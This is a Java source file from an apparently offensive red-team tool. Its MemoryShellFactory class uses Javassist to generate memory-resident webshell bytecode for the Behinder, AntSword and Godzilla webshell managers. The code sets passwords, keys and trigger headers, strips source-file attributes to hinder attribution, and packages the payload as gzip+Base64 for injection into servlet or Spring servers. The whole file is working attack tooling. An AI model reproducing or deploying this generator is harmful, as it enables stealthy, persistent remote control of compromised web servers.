package com.potato.potatotool.content.redTeam.memshell.factory;

import com.potato.potatotool.utils.data.GzipUtils;
import com.potato.potatotool.utils.data.StrUtils;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryObj;
import com.potato.potatotool.content.redTeam.memshell.config.MemoryShellConstants;
import com.potato.potatotool.content.redTeam.memshell.util.JavassistUtil;
import com.potato.potatotool.content.redTeam.memshell.util.MemoryShellUtil;
import com.potato.potatotool.content.redTeam.memshell.util.ResponseCodeUtil;

import javax.servlet.Filter;
import javax.servlet.ServletRequestListener;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;

public class MemoryShellFactory {
    @SuppressWarnings("unchecked")
    ClassPool CLASS_POOL = ClassPool.getDefault();

    public byte[] generateShell(MemoryObj memoryObj) throws Exception {
        String toolType = memoryObj.getToolType();
        String shellType = memoryObj.getShellType();
        byte[] bytes;

        if(toolType.equals(MemoryShellConstants.TOOL_CUSTOM)){
            bytes = customShellBytes(memoryObj);
        }else {
            String shellClassName = MemoryShellUtil.getShellClassName(toolType, shellType);
            bytes = transformShellBytes(shellClassName, memoryObj);
        }

        // 设置内存对象的字节数组、字节长度以及gzip后的Base64字符串
        memoryObj.setShellBytes(bytes);
        memoryObj.setShellBytesLength(bytes.length);
        memoryObj.setShellGzipBase64String(StrUtils.base64Encode(GzipUtils.GzipGetCompressedData(bytes)));

        return bytes;
    }

    // 转换内存马字节码的方法
    private byte[] transformShellBytes(String className, MemoryObj memoryObj) {
        byte[] bytes = new byte[0];
        try {
            String toolType = memoryObj.getToolType();
            String shellType = memoryObj.getShellType();

            CLASS_POOL.insertClassPath(new ClassClassPath(this.getClass()));
            CtClass ctClass = CLASS_POOL.getCtClass(className);

            // 如果内存马类型不是 WFHANDLERMETHOD，则设置Java版本和头字段
            if (!shellType.equals(MemoryShellConstants.SHELLTYPE_WFHANDLERMETHOD)) {
                ctClass.getClassFile().setVersionToJava5();
                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerName", memoryObj.getHeaderName());
                JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "headerValue", memoryObj.getHeaderValue());
            }

            // 根据工具类型设置不同的字段
            switch (toolType) {
                case MemoryShellConstants.TOOL_BEHINDER:
                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", StrUtils.md5(memoryObj.getPass()).substring(0, 16));
                    break;
                case MemoryShellConstants.TOOL_ANTSWORD:
                case MemoryShellConstants.TOOL_GODZILLA:
                    JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "pass", memoryObj.getPass());
                    if (toolType.equals(MemoryShellConstants.TOOL_GODZILLA)) {
                        JavassistUtil.addOrUpdateFieldIfNotNull(ctClass, "key", StrUtils.md5(memoryObj.getKey()).substring(0, 16));
                    }
                    break;
            }

            JavassistUtil.setClassNameIfNotNull(ctClass, memoryObj.getShellClassName());

            // 如果内存马类型是 LISTENER，则添加相应的获取HTTP响应的方法
            if (shellType.equals(MemoryShellConstants.SHELLTYPE_LISTENER)) {
                String methodBody = ResponseCodeUtil.getResponseCode(memoryObj.getServerType());
                JavassistUtil.addOrUpdateMethod(ctClass, "getResponseFromRequest", methodBody);
            }
            // 移除源文件属性，生成字节码并分离类
            JavassistUtil.removeSourceFileAttribute(ctClass);
            bytes = ctClass.toBytecode();
            ctClass.detach();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bytes;
    }

    private byte[] customShellBytes(MemoryObj memoryObj) throws Exception {
        File classFile;
        classFile = new File(memoryObj.getClassFilePath());
        if (classFile.exists() && classFile.isFile()) {
            ClassPool classPool = ClassPool.getDefault();
            classPool.insertClassPath(new ClassClassPath(Filter.class));
            classPool.insertClassPath(new ClassClassPath(ServletRequestListener.class));
            classPool.makeInterface("org.springframework.web.servlet.AsyncHandlerInterceptor");
            classPool.makeInterface("org.springframework.web.servlet.HandlerInterceptor");
            String filePath = memoryObj.getClassFilePath();
            CtClass ctClass = classPool.makeClass(new DataInputStream(new FileInputStream(filePath)));
            memoryObj.setShellClassName(ctClass.getName());
            ctClass.detach();
        }

        byte[] bytes = StrUtils.readFile(memoryObj.getClassFilePath());

        return bytes;
    }

}
